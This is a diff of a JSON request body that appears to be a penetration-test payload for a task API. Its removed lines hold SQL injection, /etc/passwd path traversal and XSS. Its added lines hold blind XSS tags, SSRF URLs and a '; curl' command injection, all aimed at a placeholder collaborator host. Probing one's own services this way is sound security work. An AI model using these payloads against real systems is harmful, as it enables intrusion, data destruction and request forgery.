@@ -1,9 +1,9 @@
 {
-  "name": "Task Injection Test; DROP TABLE users; --",
-  "priority": 101,
+  "name": "Task Test <img src='https://YOUR_COLLABORATOR_URL' onerror='alert(1)'>",  // Blind XSS attempt in 'name' field
+  "priority": 101,  // Boundary test for 'priority'
   "source": {
     "sourceType": "location",
-    "path": "/../../../etc/passwd"
+    "path": "https://YOUR_COLLABORATOR_URL"  // SSRF attempt in 'path' field
   },
   "xilConfigRequirements": [
     {
@@ -14,9 +14,24 @@
         {
           "label": "detail_label",
           "category": "category1",
-          "value": "<img src=x onerror=alert('XSS')>"  // Adjusted XSS payload
+          "value": "<img src='https://YOUR_COLLABORATOR_URL'>",  // XSS attempt in 'details' field
+          "otherField": "<script src='https://YOUR_COLLABORATOR_URL'></script>"  // Another XSS attempt using script tag
         }
       ]
     }
-  ]
+  ],
+  "extraField": "<iframe src='https://YOUR_COLLABORATOR_URL'></iframe>",  // Extra field for schema validation test and XSS
+  "details": [
+    {
+      "label": "extra_detail",
+      "category": "test_category",
+      "value": "https://YOUR_COLLABORATOR_URL"  // SSRF attempt in unrecognized 'details' field
+    }
+  ],
+  "sourceControl": {
+    "sourceType": "scm",
+    "scmLabel": "scm_test",
+    "scmUrl": "https://YOUR_COLLABORATOR_URL",  // Potential SSRF attempt with SCM URL
+    "scmCommit": "; curl https://YOUR_COLLABORATOR_URL"  // Command injection attempt
+  }
 }
